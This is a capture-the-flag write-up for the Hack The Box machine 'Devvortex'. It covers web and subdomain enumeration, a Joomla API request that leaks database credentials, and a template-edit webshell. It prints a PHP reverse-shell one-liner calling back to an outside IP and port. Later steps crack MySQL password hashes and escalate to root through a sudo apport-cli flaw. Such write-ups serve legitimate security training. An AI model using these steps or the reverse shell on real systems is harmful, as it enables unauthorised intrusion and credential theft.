---
slug: /write-up/htb/machines/easy/devvortex
pagination_next: null
pagination_prev: null
---

## Enumeration

First of all, we access via browser to the IP and got redirected to http://devvortex.htb/, let's add it to /etc/hosts.

Navigating a bit, we can see that it might be vulnerable to file inclusion, since requesting an non-existing page: http://devvortex.htb/aa.html showed a nginx server error

```bash
└─$ whatweb http://devvortex.htb                 
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```


Let's try to extract all the files we can find in the server with `fuff`:

```bash
ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html
```

So far, nothing weird appears to be accessible:

```
about                   [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 40ms]
contact                 [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 207ms]
do                      [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 38ms]
index                   [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 45ms]
portfolio               [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 42ms]
```

The images are served from http://devvortex.htb/images/hero-bg.jpg, if we try to access /images we get 403, let's try to fuzz the directories by checking if they return 403:

```
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 52ms]
                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 47ms]
```

Nothing so far, let's check what other ports are open with nmap:

```
└─$ nmap devvortex.htb   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:42 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Let's check versions:

http

```
└─$ nmap devvortex.htb -p80 -sC -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
```

ssh

```
└─$ nmap devvortex.htb -p22 -sC -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds
```

Nothing seems weird, let's try to scan for ALL ports opened, nothing else found.

Let's enumerate subdomains by using the Host header:

```bash
ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fl 8
```

Got this subdomain:

```
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 88ms]
```

which looks like it's serving php content: `http://dev.devvortex.htb/index.php`

A simple scan with ffuf reveals interesting stuff:

```
.git/logs/              [Status: 403, Size: 3653, Words: 792, Lines: 70, Duration: 90ms]
configuration           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
index                   [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 80ms]
```

With .git/log we can reconstruct the source code but it's returning a 403.
configuration.php looks like a blank page, but it's a PHP page, so it would be interesting to note it for future usage.

Let's enumerate directories:

```
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 465ms]
```

- http://dev.devvortex.htb/error.php  --> File not found. 
- http://dev.devvortex.htb/any.php  --> File not found.

Looks a possible LFI attack vector, checking /robots.txt reveals this is a Joomla CMS page.

Following the paths in the robots.txt, we can see this URL: http://dev.devvortex.htb/administrator/index.php

Now that we know it's a Joomla CMS page, let's make a Google search, and we found the following links:

- https://hackertarget.com/attacking-enumerating-joomla/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
- https://vulncheck.com/blog/joomla-for-rce


## Foothold

```bash
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

According to the articles, this URLS leaks the user/password for the mysql database used by joomla. However, the same user/password has been re-used for the Joomla CMS admin user

Once we have admin access to joomla instance, we can modify a template php files to include RCE, e.g.:

http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=id

Now let's send a reverse shell:

```bash
php -r '$sock=fsockopen("10.10.14.218",9001);popen("/bin/sh <&3 >&3 2>&3", "r");'
```
with URL-encode:

http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.218%22%2C9001%29%3Bpopen%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27

We got a reverse-shell, but to `www-data` user, in order to get the flag, we need to get access to `logan` user.

## Lateral movement

According to the article, the leaked credentials are used to connect the MySQL database, so, let's connect to the DB re-using the credentials.

We go to the users table and see the hashed passwords:

```bash
mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

We can try to crack the hash with hashcat:

```bash
hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt
```

and it worked, it reveal the password for the user logan, now we can connect with SSH and read the user flag.

## Privilege escalation

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Just do a quick search about the sudoable app and found a poc to get root access: https://github.com/diego-tella/CVE-2023-1326-PoC

I tired and it just worked giving root access and we got root flag.
